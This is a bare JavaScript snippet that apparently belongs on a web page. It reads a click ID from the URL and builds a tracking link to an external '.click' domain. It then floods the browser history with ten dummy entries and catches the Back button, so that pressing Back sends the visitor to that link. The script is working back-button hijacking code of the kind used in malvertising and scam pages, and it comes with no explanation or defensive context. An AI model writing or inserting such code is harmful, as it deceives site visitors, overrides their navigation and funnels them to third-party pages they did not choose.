var binomclickid = new URLSearchParams(window.location.search).get('clickid') || '';
var baseUrl = 'https://m.bolo2vas61.click/c/n/256148/4989';
var back = baseUrl + (binomclickid ? '?cid=' + encodeURIComponent(binomclickid) : '');
if (typeof back !== "undefined" && back !== null) {
    !(function() {
        var t;
        try {
            const URL = window.location.href.split(/[#]/)[0];
            for (t = 0; t < 10; ++t) {
                history.pushState({}, '', URL + '#');
            }
            onpopstate = function(event) {
                event.state && location.replace(back);
            };
        } catch (o) {
            console.log(o);
        }
    })();
}